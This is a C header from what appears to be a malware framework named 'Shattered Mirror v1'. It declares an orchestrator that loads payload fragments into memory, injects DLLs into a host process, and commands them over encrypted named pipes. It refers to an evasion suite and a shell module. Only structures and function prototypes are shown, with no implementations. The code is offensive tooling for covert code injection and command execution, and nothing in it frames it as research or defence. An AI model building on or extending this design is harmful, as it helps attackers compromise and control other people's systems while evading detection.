#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Orchestrator: Atom Manager & IPC Definitions
 *
 * This header defines the structures and interfaces for the Atom Manager
 * and the Encrypted Named Pipe IPC system.
 *
 * The Atom Manager dynamically loads payload fragments (Atoms) into
 * memory and maintains communication with them using Named Pipes.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_MANAGER_H
#define SMIRROR_ATOM_MANAGER_H

#include "../Evasion_Suite/include/common.h"

/*---------------------------------------------------------------------------
 * IPC Command Structures
 *-------------------------------------------------------------------------*/
#define MAX_IPC_PAYLOAD_SIZE 4096

typedef enum _ATOM_COMMAND_ID {
    CMD_HEARTBEAT = 0x01,
    CMD_EXECUTE   = 0x02,
    CMD_REPORT    = 0x03,
    CMD_TERMINATE = 0x04
} ATOM_COMMAND_ID;

typedef struct _IPC_MESSAGE {
    DWORD           dwSignature;  /* 0x534D4952 "SMIR" */
    ATOM_COMMAND_ID CommandId;
    DWORD           AtomId;       /* Target Atom ID for routing (e.g., 10 for Shell) */
    DWORD           dwPayloadLen;
    BYTE            Payload[MAX_IPC_PAYLOAD_SIZE];
} IPC_MESSAGE, *PIPC_MESSAGE;

/*---------------------------------------------------------------------------
 * Atom Tracking Structures
 *-------------------------------------------------------------------------*/
typedef enum _ATOM_STATUS {
    ATOM_STATUS_UNINITIALIZED = 0,
    ATOM_STATUS_STARTING      = 1,
    ATOM_STATUS_RUNNING       = 2,
    ATOM_STATUS_DEAD          = 3
} ATOM_STATUS;

typedef struct _ATOM_RECORD {
    DWORD       dwAtomId;
    HANDLE      hProcess;       /* Process hosting the atom */
    HANDLE      hPipe;          /* Named pipe handle for IPC */
    ATOM_STATUS Status;
    DWORD       dwLastHeartbeat;/* Tick count of last received heartbeat */
} ATOM_RECORD, *PATOM_RECORD;

#define MAX_ATOMS 10

/*---------------------------------------------------------------------------
 * IPC Functions
 *-------------------------------------------------------------------------*/
/* Create a named pipe server for a specific Atom ID */
HANDLE IPC_CreateServerPipe(DWORD dwAtomId);

/* Connect to a named pipe (used by Atoms) */
HANDLE IPC_ConnectToPipe(DWORD dwAtomId);

/* Send an encrypted message over the pipe */
BOOL IPC_SendMessage(HANDLE hPipe, PIPC_MESSAGE pMsg, BYTE* pEncKey, DWORD dwKeyLen);

/* Receive and decrypt a message from the pipe */
BOOL IPC_ReceiveMessage(HANDLE hPipe, PIPC_MESSAGE pMsg, BYTE* pEncKey, DWORD dwKeyLen);

/*---------------------------------------------------------------------------
 * Atom Manager Functions
 *-------------------------------------------------------------------------*/
/* Initialize the Atom Manager subsystem */
BOOL InitAtomManager(void);

/* Main loop for the Orchestrator thread */
DWORD WINAPI OrchestratorMain(LPVOID lpParam);

/* Spawn an atom (injects the specific Atom DLL into a safe host process) */
BOOL SpawnAtom(DWORD dwAtomId, const BYTE* pAtomCode, SIZE_T szAtomSize);

#endif /* SMIRROR_ATOM_MANAGER_H */
